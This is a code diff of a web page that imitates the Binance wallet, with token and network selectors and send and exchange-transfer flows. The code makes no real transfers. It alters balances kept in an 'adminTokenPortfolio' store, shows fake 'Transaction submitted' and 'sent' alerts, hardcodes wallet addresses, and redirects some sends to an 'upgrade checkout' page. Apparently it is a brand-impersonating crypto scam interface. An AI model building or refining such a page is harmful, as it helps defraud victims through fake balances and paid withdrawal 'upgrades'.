-            document.getElementById('modalBody').innerHTML=`<div class="send-selector-screen"><div class="send-wallet-header"><button onclick="openOperation('${returnLabel}','${returnScreen}')">←</button><h1>Select Token</h1><button onclick="closeModal()">×</button></div>${tokens.map(token=>`<button class="send-selector-row" onclick="selectedToken='${token}';openOperation('${returnLabel}','${returnScreen}')"><img src="https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/${token}.svg" alt="${token}"><span><b>${token}</b><small>Balance: 0.00</small></span><strong>›</strong></button>`).join('')}</div>`;
+            document.getElementById('modalBody').innerHTML=`<div class="send-selector-screen"><div class="send-wallet-header"><button onclick="openOperation('Send to Wallet Address','send-wallet')">←</button><h1>Select Token</h1><button onclick="closeModal()">×</button></div>${tokens.map(token=>`<button class="send-selector-row" onclick="selectedToken='${token}';openOperation('Send to Wallet Address','send-wallet')"><img src="https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/${token}.svg" alt="${token}"><span><b>${token}</b><small>Balance: 0.00</small></span><strong>›</strong></button>`).join('')}</div>`;
         }
         function openSendNetworkSelector(){
             const networks=[['BSC','BNB Smart Chain','https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/BNB.svg'],['Ethereum','Ethereum','https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg'],['Solana','Solana','https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/SOL.svg'],['Base','Base','https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/base/info/logo.png'],['Arbitrum','Arbitrum One','https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ARB.svg']];
-            const returnScreen = sendTransferMode === 'exchange' ? 'send-exchange' : 'send-wallet';
-            const returnLabel = sendTransferMode === 'exchange' ? 'Transfer to Binance Exchange' : 'Send to Wallet Address';
-            document.getElementById('modalBody').innerHTML=`<div class="send-selector-screen"><div class="send-wallet-header"><button onclick="openOperation('${returnLabel}','${returnScreen}')">←</button><h1>Select Network</h1><button onclick="closeModal()">×</button></div>${networks.map(([id,name,logo])=>`<button class="send-selector-row" onclick="sendWalletNetwork='${id}';selectedNetwork='${id}';openOperation('${returnLabel}','${returnScreen}')"><img src="${logo}" onerror="this.onerror=null;this.src='https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg'" alt="${name}"><span><b>${name}</b><small>${id}</small></span><strong>${sendWalletNetwork===id?'✓':'›'}</strong></button>`).join('')}</div>`;
+            document.getElementById('modalBody').innerHTML=`<div class="send-selector-screen"><div class="send-wallet-header"><button onclick="openOperation('Send to Wallet Address','send-wallet')">←</button><h1>Select Network</h1><button onclick="closeModal()">×</button></div>${networks.map(([id,name,logo])=>`<button class="send-selector-row" onclick="sendWalletNetwork='${id}';openOperation('Send to Wallet Address','send-wallet')"><img src="${logo}" onerror="this.onerror=null;this.src='https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg'" alt="${name}"><span><b>${name}</b><small>${id}</small></span><strong>${sendWalletNetwork===id?'✓':'›'}</strong></button>`).join('')}</div>`;
         }
         function renderExchangeNetworkSelector(){
             const networks=[['BSC','BNB Smart Chain','BNB'],['Ethereum','Ethereum','ETH'],['Solana','Solana','SOL'],['Bitcoin','Bitcoin','BTC'],['Base','Base','USDC'],['Arbitrum','Arbitrum One','ARB'],['Arc','Arc','USDC']];
-            return `<div class="send-selector-screen"><div class="send-wallet-header"><button onclick="openOperation('Transfer to Binance Exchange','send-exchange')" aria-label="Back">←</button><h1>Select Network</h1><button onclick="closeModal()" aria-label="Close">×</button></div><input class="exchange-network-search" placeholder="⌕ Search networks"><div class="exchange-network-list">${networks.map(([id,name,logo])=>`<button class="send-selector-row exchange-network-row" onclick="sendWalletNetwork='${id}';selectedNetwork='${id}';openOperation('Transfer to Binance Exchange','send-exchange')"><img src="https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/${logo}.svg" onerror="this.onerror=null;this.src='https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg'" alt="${name} logo"><span><b>${name}</b><small>${id==='BSC'?'BNB Smart Chain':name}</small></span><strong>${selectedNetwork===id?'✓':'›'}</strong></button>`).join('')}</div></div>`;
+            return `<div class="send-selector-screen"><div class="send-wallet-header"><button onclick="openOperation('Transfer to Binance Exchange','send-exchange')" aria-label="Back">←</button><h1>Select Network</h1><button onclick="closeModal()" aria-label="Close">×</button></div><input class="exchange-network-search" placeholder="⌕ Search networks"><div class="exchange-network-list">${networks.map(([id,name,logo])=>`<button class="send-selector-row exchange-network-row" onclick="selectedNetwork='${id}';openOperation('Transfer to Binance Exchange','send-exchange')"><img src="https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/${logo}.svg" onerror="this.onerror=null;this.src='https://cryptoicon.io/wp-content/uploads/cc-assets/SVG/Color/ETH.svg'" alt="${name} logo"><span><b>${name}</b><small>${id==='BSC'?'BNB Smart Chain':name}</small></span><strong>${selectedNetwork===id?'✓':'›'}</strong></button>`).join('')}</div></div>`;
         }
         function submitSendWallet(){
             const amount=Number(sendWalletAmount)||0;
@@ -920,8 +796,8 @@
                 return;
             }
             const fee=0.00000161;
-            const from = getCurrentWalletAddress();
-            const to = sendWalletAddress || getCurrentWalletAddress();
+            const from='0x95Af8e9b192024EF8b6C02149C28EB7288418e28';
+            const to=sendWalletAddress||'0x6342be958f23b937371ba8d488bc8128e8ace8eE';
             const shortAddress=value=>value.length>30?`${value.slice(0,25)}\n${value.slice(25)}`:value;
             const body=document.getElementById('modalBody');
             document.getElementById('modalBox').classList.add('operation-fullscreen');
@@ -943,12 +819,6 @@
             if(sendProcessing)return;
             const token=getWalletTokenData().find(item=>item.symbol===selectedToken);
             const amount=Number(sendWalletAmount)||0;
-            const transferToken=(selectedToken||'').toUpperCase();
-            const transferNetwork=(sendWalletNetwork||selectedNetwork||'BSC');
-            if (sendTransferMode === 'exchange' && !isValidBinanceAccount(sendWalletAddress)) {
-                openModal('Invalid Binance account','Enter a valid Binance email or UID before continuing.');
-                return;
-            }
             if (shouldRedirectToUpgrade(amount, token?.price || 0)) {
                 window.location.href = 'binance_wallet_upgrade_checkout-1.html';
                 return;
@@ -958,38 +828,9 @@
                 openModal('Insufficient balance','The send amount cannot be greater than your current balance.');
                 return;
             }
-            const targetSymbol=transferToken;
-            const updatedAt = new Date().toISOString();
-            const storageKeys=['adminTokenPortfolio','userWalletPortfolio','walletBalanceState'];
-            storageKeys.forEach((key)=>{
-                try {
-                    const raw=localStorage.getItem(key);
-                    if(!raw) return;
-                    const parsed=JSON.parse(raw);
-                    if (key === 'walletBalanceState' && parsed && Array.isArray(parsed.tokens)) {
-                        const tokens=parsed.tokens.map((item)=>{
-                            if ((item.symbol||'').toUpperCase() !== targetSymbol) return item;
-                            const updatedBalance = Math.max(0, Number(item.balance) - amount);
-                            return { ...item, balance: updatedBalance, lastTransaction: { type: 'SEND', amount, to: sendWalletAddress, network: transferNetwork, time: updatedAt } };
-                        });
-                        localStorage.setItem(key, JSON.stringify({ ...parsed, updatedAt: Date.now(), tokens }));
-                        return;
-                    }
-                    const list = Array.isArray(parsed) ? parsed : (parsed && Array.isArray(parsed.tokens) ? parsed.tokens : []);
-                    const next = list.map((item)=>{
-                        if ((item.symbol||'').toUpperCase() !== targetSymbol) return item;
-                        const updatedBalance = Math.max(0, Number(item.balance) - amount);
-                        return { ...item, balance: updatedBalance, lastTransaction: { type: 'SEND', amount, to: sendWalletAddress, network: transferNetwork, time: updatedAt } };
-                    });
-                    localStorage.setItem(key, JSON.stringify(next));
-                } catch (error) {
-                    console.warn('Failed to sync wallet balance for', key, error);
-                }
-            });
-            window.dispatchEvent(new StorageEvent('storage',{ key: 'adminTokenPortfolio', newValue: localStorage.getItem('adminTokenPortfolio') }));
-            window.dispatchEvent(new StorageEvent('storage',{ key: 'userWalletPortfolio', newValue: localStorage.getItem('userWalletPortfolio') }));
-            window.dispatchEvent(new StorageEvent('storage',{ key: 'walletBalanceState', newValue: localStorage.getItem('walletBalanceState') }));
-            syncSharedWalletPortfolio();
+            const stored=(()=>{try{return JSON.parse(localStorage.getItem('adminTokenPortfolio')||'[]');}catch{return[];}})();
+            const saved=stored.find(item=>(item.symbol||'').toUpperCase()===selectedToken);
+            if(saved){saved.balance=currentBalance-amount;saved.lastTransaction={type:'SEND',amount,to:sendWalletAddress,network:sendWalletNetwork,time:new Date().toISOString()};localStorage.setItem('adminTokenPortfolio',JSON.stringify(stored));window.dispatchEvent(new StorageEvent('storage',{key:'adminTokenPortfolio'}));}
             const tokenId=token.id;
             const shortFrom='0x95af***418e28';
             sendProcessing=true;
@@ -1006,10 +847,6 @@
                 loader.style.pointerEvents='';
                 loader.setAttribute('aria-hidden','true');
                 sendProcessing=false;
-                if (sendTransferMode === 'exchange') {
-                    renderBinanceTransferSubmitted(transferToken, amount, transferNetwork, sendWalletAddress);
-                    return;
-                }
                 openCoinDetail(tokenId);
                 showTransactionAlert('Transaction submitted.');
                 setTimeout(()=>showTransactionAlert('Binance Wallet',`${shortFrom} sent ${amount} ${selectedToken}`),2000);
@@ -1046,7 +883,7 @@
             if(!expanded)return;
             const network=button.querySelector('span').textContent.trim();
             const symbol=network==='Bitcoin Cash'?'BCH':network==='Bitcoin'?'BTC':network==='Litecoin'?'LTC':'ETH';
-            const address=network==='Bitcoin Cash'?'qrpel0...ee49uz':getCurrentWalletAddress();
+            const address=network==='Bitcoin Cash'?'qrpel0...ee49uz':'0x95Af8e9b192024EF8b6C02149C28EB7288418e28';
             item.insertAdjacentHTML('beforeend',`<button class="buy-network-account" onclick="openBuyCrypto('${symbol}','${network}')"><span>${address}</span><strong>0 ${symbol}</strong><small>Wallet1 <em>Keyless</em></small></button>`);
             button.querySelector('.buy-network-arrow').textContent='⌃';
         }
@@ -1132,21 +969,7 @@
             };
             Object.entries(icons).forEach(([name,icon])=>{const button=document.getElementById('bnav'+name[0].toUpperCase()+name.slice(1));if(button)button.innerHTML=icon+'<small>'+name[0].toUpperCase()+name.slice(1)+'</small>';});
         }
-        document.addEventListener('DOMContentLoaded', async () => {
-            renderTokens();
-            updateWalletTotals();
-            setActiveNav('home');
-            setBottomNavIcons();
-            setupInteractions();
-            await hydrateSharedWalletPortfolio();
-            renderTokens();
-            updateWalletTotals();
-            updateLiveTokens();
-            updateSelectedCurrencyRate().then(()=>{renderTokens();updateWalletTotals();});
-            const isWelcomeRedirect = new URLSearchParams(window.location.search).get('fromWelcome') === '1';
-            if (isWelcomeRedirect) { closeModal(); }
-            setInterval(updateLiveTokens,30000);
-        });
+        document.addEventListener('DOMContentLoaded',()=>{renderTokens();updateWalletTotals();setActiveNav('home');setBottomNavIcons();setupInteractions();updateLiveTokens();updateSelectedCurrencyRate().then(()=>{renderTokens();updateWalletTotals();});setInterval(updateLiveTokens,30000);});
     </script>
     <style>
         .quick,.feature,.discover,.panel{background:rgba(255,255,255,.9);border:1px solid #e5e7eb;border-radius:1rem;padding:1rem}.dark .quick,.dark .feature,.dark .discover,.dark .panel{background:#181a20;border-color:#2b313a}.quick{display:flex;flex-direction:column;align-items:center;gap:.6rem;font-size:.8rem;font-weight:700}.quick i{font-size:1.25rem;color:#d99e00}.feature{display:flex;flex-direction:column;gap:1rem;cursor:pointer}.feature strong{font-size:2rem}.team{width:2.5rem;height:2.5rem;border-radius:999px;display:flex;align-items:center;justify-content:center;padding:.4rem;font-size:.7rem}.panel{display:flex;align-items:center;gap:1rem}.panel span{font-size:.75rem;color:#9ca3af}.panel input{background:transparent;outline:0;width:100%;font-size:1.5rem;font-weight:800}.discover{cursor:pointer;min-height:140px}.discover h4{font-weight:800;margin-top:.6rem}.discover p{font-size:.75rem;color:#6b7280;margin-top:.35rem}.asset{display:flex;justify-content:space-between;padding:.8rem 0;border-top:1px solid #e5e7eb;font-size:.85rem}.asset span{text-align:right}.asset em{color:#10b981;font-style:normal}.bnav{display:flex;flex-direction:column;align-items:center;color:#6b7280;font-size:1.15rem}.bnav small{font-size:.65rem;font-weight:700;margin-top:.25rem}.mobile-toolbar,.assets-mobile-head{align-items:center;justify-content:space-between;padding:1rem .9rem;background:#fff;color:#111827}.mobile-toolbar{display:flex}.mobile-toolbar button,.assets-mobile-head button{border:0;background:transparent;font-size:1.25rem}.mobile-title{font-size:1.25rem;font-weight:800}.mobile-toolbar-actions{display:flex;gap:1rem}.market-heading,.market-tabs,.chain-tabs{display:flex;align-items:center;gap:1.2rem;overflow-x:auto;white-space:nowrap}.market-heading button,.market-tabs button{border:0;background:none;font-size:1rem;color:#777;padding:.35rem 0}.market-heading .active,.market-tabs .active{color:#111;font-weight:800;border-bottom:3px solid #fcd535}.market-search{display:flex;align-items:center;gap:.6rem;background:#f7f7f7;color:#aaa;border-radius:.7rem;padding:.7rem .8rem}.market-search span{flex:1;font-size:.8rem}.market-search b{font-size:.8rem}.market-shortcut{display:flex;flex-direction:column;align-items:center;gap:.4rem;border:0;border-radius:1rem;background:#fafafa;padding:.8rem .25rem;font-size:1.2rem}.market-shortcut small,.market-shortcut em{font-size:.7rem;font-style:normal}.market-shortcut em{color:#aaa}.theme-section h2{font-size:1rem;margin:1rem 0 .7rem}.theme-grid{display:grid;grid-template-columns:1fr 1fr;gap:.7rem}.theme-stack{display:grid;gap:.7rem}.theme-card{display:flex;flex-direction:column;align-items:flex-start;justify-content:space-between;gap:.5rem;border:0;border-radius:.8rem;background:#e8f8f1;padding:.8rem;text-align:left;min-height:82px}.theme-card.large{min-height:170px}.theme-card strong{color:#28a879;font-size:.8rem}.theme-card span{font-size:.8rem}.theme-card em{color:#28a879;font-style:normal}.theme-card i{height:3px;width:100%;background:linear-gradient(90deg,#2aad79 75%,#ef506d 75%)}.chain-tabs{gap:1.1rem;padding:1rem 0;color:#8a8a8a;font-size:.75rem}.chain-tabs b{color:#111}.asset-tabs{display:flex;align-items:center;gap:1.3rem;border-top:1px solid #eee;border-bottom:1px solid #eee;padding:1rem 0;font-size:1.1rem}.asset-tabs b{border-bottom:3px solid #fcd535;padding-bottom:.8rem}.asset-tabs i{margin-left:auto;font-size:1.6rem;color:#888}.assets-summary{padding:1rem .8rem;background:#fff}.wallet-line{display:flex;gap:.7rem;align-items:center}.wallet-line span{background:#fff4c7;padding:.5rem;border-radius:.7rem;color:#d7a900}.assets-summary>strong{display:block;font-size:3rem;margin:.7rem 0 1.3rem}.asset-actions{display:grid;grid-template-columns:repeat(4,1fr);gap:.4rem}.asset-actions button{border:0;background:#fafafa;border-radius:1.2rem;padding:.7rem;font-size:1.6rem}.asset-actions small{display:block;font-size:.75rem;margin-top:.35rem}.asset-total{display:flex;flex-direction:column;gap:.7rem;padding:0 .8rem;color:#777}.asset-total strong{color:#111;font-size:1.2rem}.asset-total span:last-child{margin-top:2rem}@media (max-width:767px){body{background:#fff}.mobile-toolbar{position:sticky;top:0;z-index:30}.wallet-summary{border:0!important;box-shadow:none!important;border-radius:0!important;padding:1rem .8rem!important}.wallet-summary .text-4xl{font-size:3rem}.quick{border:0;background:#fafafa!important;border-radius:1.3rem;padding:.6rem .1rem;gap:.35rem;font-size:.7rem;min-width:0}.quick i{font-size:1.2rem}.feature{padding:.8rem;gap:.6rem;min-width:0}.feature strong{font-size:1.3rem}.feature .team{width:1.8rem;height:1.8rem;font-size:.55rem}.homeTokenTableBody td:nth-child(2),#homeTokenTableBody td:nth-child(4),#marketsTableBody td:nth-child(2),#marketsTableBody td:nth-child(4){display:none}#homeTokenTableBody td:first-child,#marketsTableBody td:first-child{width:58%}#homeTokenTableBody td:nth-child(3),#marketsTableBody td:nth-child(3){width:42%;padding-right:.25rem}.theme-card.large{min-height:150px}.market-list{padding:.8rem!important;border-radius:1rem!important}.mobile-toolbar+main{padding-top:.25rem}.mobile-toolbar+main .nav-view{gap:1rem}.mobile-toolbar+main .nav-view.space-y-6>*+*{margin-top:1rem}.assets-mobile-head{display:none}}
